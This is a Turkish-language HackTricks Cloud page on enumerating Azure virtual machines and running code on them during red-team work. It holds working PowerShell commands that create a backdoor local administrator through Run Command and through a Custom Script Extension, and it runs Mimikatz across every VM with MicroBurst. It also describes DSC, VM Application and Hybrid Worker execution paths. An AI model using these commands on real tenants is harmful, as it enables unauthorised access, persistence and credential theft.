# Az - Sanal Makineler & Ağ

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Temel bilgiler

[Belgelerden:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure sanal makineleri, Azure'un sunduğu birkaç tür [talep üzerine, ölçeklenebilir hesaplama kaynaklarından](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) biridir. Genellikle, diğer seçeneklerin sunduğundan daha fazla kontrol gerektiğinde bir sanal makine seçersiniz. Bu makale, bir sanal makine oluşturmadan önce dikkate almanız gerekenler, nasıl oluşturulacağı ve nasıl yönetileceği hakkında bilgi verir.

## Azure Ağ Bilgileri

Azure ağları **farklı varlıklar ve bunları yapılandırma yolları** içerir. Farklı Azure ağ varlıklarının kısa **tanımları,** **örnekleri** ve **enumeration** komutlarını bulabilirsiniz:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**, Azure portalı üzerinden SSL aracılığıyla güvenli, tamamen yönetilen RDP (Uzak Masaüstü Protokolü) ve SSH (Güvenli Kabuk) erişim çözümü sunar. Azure Sanal Ağı içinde entegre edilmiştir ve özel IP'ler kullanarak VM'lere RDP ve SSH bağlantısı sağlar, bu da genel IP'lere ihtiyaç duymadan yapılmasını sağlar. Bu, genel IP atamaları ve VM erişimi için NSG kural yapılandırmaları içeren geleneksel yöntemlere göre daha güvenli ve daha uygun bir alternatif sunar. Geliştiriciler ve BT personeli, geliştirme ve test ortamları için süreci kolaylaştırarak web tarayıcılarını kullanarak Azure portalından VM'lere güvenli bir şekilde erişebilirler.

Aboneliğinizdeki tüm Azure Bastion Host'larını listelemek için aşağıdaki komutu kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Sayımı
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **VM'de komut çalıştırma**

### **VM'de AAD Girişi**

AzureAD üzerinden kimlik doğrulaması yapılmış kullanıcılara erişim izni vermek mümkündür. Örneğin bir **linux VM**'ye erişmeye çalışırken: `ssh username@azure-corp.com@1.1.1.1` (giriş yapmaya çalışırken kullanılan azurecorp ile **e-posta** kullanmak önemlidir) şu hatayı alabilirsiniz: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Sadece **bu talimatları takip edin** [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) adresine giderek ve kodu belirterek, e-posta ve şifreyi kimlik bilgileri olarak kullanarak SSH ile bağlanabileceksiniz (eğer o kullanıcının bunu yapacak yeterli yetkisi varsa: `Virtual Machine Administrator Login` veya `Virtual Machine User Login` rolü).

### **Komut Çalıştır**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Özel Betik Uzantısını Çalıştır**

Azure sanal makine (VM) uzantıları, **Azure VM'lerinde** dağıtım sonrası yapılandırma ve otomasyon **görevleri** sağlayan **küçük uygulamalardır**. Örneğin, bir sanal makinenin yazılım kurulumu, antivirüs koruması veya içinde bir betik çalıştırma yeteneğine ihtiyacı varsa, bir VM uzantısı kullanabilirsiniz.

Bu nedenle, yazma erişiminiz varsa, rastgele kod çalıştırabilirsiniz:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC), kod aracılığıyla bir ana bilgisayarı kurmak için kullanılan Ansible'a benzer bir PowerShell aracıdır. DSC, belirli yapılandırma dosyalarının yüklenmesine olanak tanıyarak Azure ile entegre olur. Bu dosyaların katı bir sözdizimine uyması gerekmektedir. Özellikle, Azure'daki DSC uzantısı, belirli biçimlendirme kriterlerini karşılayan dosyalardan komutları çalıştırabilir; bu, sağlanan şekilde gösterildiği gibi, DSC standartları için sözdizimi doğru olmasa bile mümkündür.

Bu komutların yürütülmesi, Az PowerShell'deki [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) işlevi ile kolaylaştırılır. Gereksinimler arasında tanımlı bir işlev içeren bir **.PS1** dosyası ve dosyanın **.zip** dosyasına sıkıştırılması yer alır. Sözdizimi DSC için doğru olmasa bile, kod yine de çalışacaktır. Ancak, uzantı yürütme durumunu "başarısızlık" olarak işaretleyecek ve komuttan hiçbir çıktı görünmeyecektir çünkü durum, başarısızlık mesajı tarafından üzerine yazılacaktır.

### VM Uygulama Tanımları

VM Uygulama Tanımları, sürümlü uygulamaların bir Azure VM'ye tekrarlanabilir bir şekilde dağıtılmasına olanak tanır. Bu kaynak, uygulamaların VM'ler arasında dağıtımını ve güncellenmesini destekler. Bunu ayarlamak için, Az PowerShell'de **`New-AzGalleryApplication`** ve **`New-AzGalleryApplicationVersion`** gibi komutları içeren birkaç adım gereklidir.

Bu yöntemle uygulamaların veya komutların yürütülmesi, bir uygulama bir VM'ye uygulandığında otomatik olarak kurulan **"VMAppExtension"** aracılığıyla gerçekleştirilir. Uzantı, dosyayı belirtilen URI'den alır ve dosyayı tam olarak uygulama adıyla, uzantı olmadan adlandırır. Dosyanın doğru bir şekilde yürütülmesi için, REST API çağrısındaki "ManageActions" alanının dosyayı uygun uzantıyla yeniden adlandıracak şekilde yapılandırılması gerekir. Bu yöntemin kurulumu tamamlandığında, sağlanan şekilde gösterilen yapıya benzeyecektir.

Ancak, bu yürütme yöntemi nispeten yavaştır; bir uygulama veya komutun yürütülmesi yaklaşık 3-4 dakika sürer. Bu süreçle ilgili dosyalar belirli dizinlerde saklanır (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` uygulama kopyası için ve `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` yürütme durumu için).

Her iki teknik de Azure ortamlarında komutları yürütme ve uygulamaları dağıtma konusunda benzersiz yollar sunar; her birinin kendine özgü gereksinimleri, adımları ve dikkate alınması gereken hususları vardır.

### Azure'daki Hibrit Çalışan Grupları (HWG'ler)

[**Hibrit Çalışan Grupları (HWG'ler)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker), bir Otomasyon Hesabında yapılandırılan Runbook'ların, belirlenen HWG'nin bir parçası olan bir Azure Sanal Makinesi (VM) üzerinde yürütülmesine olanak tanıyan bir Azure özelliğidir. Bu yürütme, VM üzerinde Runbook kodunu dağıtan bir uzantı aracılığıyla kolaylaştırılır. Bu sürecin önemli bir yönü, gerçek kimlik bilgilerin yürütmede bir faktör olmamasıdır çünkü kod, yükseltilmiş ayrıcalıklarla, özellikle **SYSTEM** veya root olarak çalışır; bu, sağlanan şekilde gösterilmiştir.

Windows 10 VM'leri kullananlar için kritik bir detay, Runbook için PowerShell sürümünü belirtme gerekliliğidir. PowerShell Sürüm 5.1 olarak çalışacak şekilde ayarlanmalıdır; 7.1 yerine. Bu gereklilik, PowerShell 7.1'in bu VM'lerde varsayılan olarak yüklü olmamasından kaynaklanmaktadır; bu nedenle 7.1 sürümü belirtilirse, betik yürütme başarısız olur.

Azure'ın bu özelliği, hibrit ortamlarda görevleri otomatikleştirmek ve yönetmek için sağlam bir yöntem sunar; Azure VM'leri üzerinde merkezi yönetim ve görev yürütme olanağı sağlar.

## Referanslar

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
